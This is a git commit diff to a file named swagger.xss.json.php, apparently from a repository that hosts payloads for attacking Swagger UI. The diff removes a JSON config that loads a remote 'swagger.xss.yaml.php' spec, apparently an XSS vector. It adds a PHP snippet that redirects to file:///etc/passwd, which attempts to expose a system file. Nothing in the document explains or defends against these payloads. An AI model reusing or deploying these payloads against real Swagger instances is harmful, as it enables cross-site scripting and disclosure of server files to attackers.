e12f211f2c2ec23126e0a504deb89f3b30992788
Xandsz <64386219+Lokii808@users.noreply.github.com>
2024-06-11 21:35:44 -0300

    Update swagger.xss.json.php

--- swagger.xss.json.php
+++ swagger.xss.json.php
@@ -1,9 +1,3 @@
-{
-    "url": "https://raw.githubusercontent.com/Lokii808/swagger1/main/swagger.xss.yaml.php",
-    "urls": [
-        {
-            "url": "https://raw.githubusercontent.com/Lokii808/swagger1/main/swagger.xss.yaml.php",
-            "name": "Foo"
-        }
-    ]
-}
+<?php 
+	header('Location: file:///etc/passwd'); 
+?>
